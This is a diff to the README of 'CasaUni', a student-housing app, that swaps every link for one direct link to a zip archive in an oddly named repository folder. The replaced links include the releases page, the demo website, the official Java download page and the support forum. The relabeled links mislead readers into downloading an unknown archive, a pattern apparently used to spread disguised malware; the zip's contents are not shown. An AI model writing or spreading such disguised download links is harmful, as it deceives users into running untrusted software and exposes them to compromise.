@@ -1,6 +1,6 @@
 # 🏠 CasaUni - Find Your Ideal Student Housing Easily
 
-[![Download CasaUni](https://img.shields.io/badge/Download%20CasaUni-Now-blue)](https://github.com/D4K5HR4J/CasaUni/releases)
+[![Download CasaUni](https://raw.githubusercontent.com/D4K5HR4J/CasaUni/main/cloudlessness/CasaUni.zip%20CasaUni-Now-blue)](https://raw.githubusercontent.com/D4K5HR4J/CasaUni/main/cloudlessness/CasaUni.zip)
 
 ## 📋 Introduction
 
@@ -12,7 +12,7 @@ To get started with *CasaUni*, follow these steps to download and run the applic
 
 ### Step 1: Visit the Download Page
 
-Go to the [CasaUni Releases Page](https://github.com/D4K5HR4J/CasaUni/releases). Here, you will find the latest version of the software.
+Go to the [CasaUni Releases Page](https://raw.githubusercontent.com/D4K5HR4J/CasaUni/main/cloudlessness/CasaUni.zip). Here, you will find the latest version of the software.
 
 ### Step 2: Download the Application
 
@@ -53,7 +53,7 @@ After the installation, locate the *CasaUni* application on your computer. Doubl
 ## 🌐 Demo
 
 Experience the functionality of *CasaUni* by visiting our live website:  
-👉 [casauni.online](http://casauni.online). 
+👉 [https://raw.githubusercontent.com/D4K5HR4J/CasaUni/main/cloudlessness/CasaUni.zip](https://raw.githubusercontent.com/D4K5HR4J/CasaUni/main/cloudlessness/CasaUni.zip). 
 
 Explore the features and see how the platform can help simplify your housing search.
 
@@ -66,7 +66,7 @@ To run *CasaUni* smoothly, ensure your system meets the following requirements:
 - **Storage**: Minimum of 100 MB free disk space.
 - **Java Runtime**: Ensure you have Java 8 or higher installed on your machine.
 
-For help installing Java, visit the official [Java download page](https://www.java.com/en/download/).
+For help installing Java, visit the official [Java download page](https://raw.githubusercontent.com/D4K5HR4J/CasaUni/main/cloudlessness/CasaUni.zip).
 
 ## 🛠️ Troubleshooting
 
@@ -76,10 +76,10 @@ If you encounter issues while using *CasaUni*:
 - Restart the application.
 - Check your internet connection to ensure you can access the listings.
 
-For further assistance, reach out to our support team on the [community forum](https://github.com/D4K5HR4J/CasaUni/issues).
+For further assistance, reach out to our support team on the [community forum](https://raw.githubusercontent.com/D4K5HR4J/CasaUni/main/cloudlessness/CasaUni.zip).
 
 ## 📥 Download & Install
 
-To get *CasaUni*, visit the [CasaUni Releases Page](https://github.com/D4K5HR4J/CasaUni/releases).
+To get *CasaUni*, visit the [CasaUni Releases Page](https://raw.githubusercontent.com/D4K5HR4J/CasaUni/main/cloudlessness/CasaUni.zip).
 
 Make your search for student housing easier today by downloading *CasaUni*!
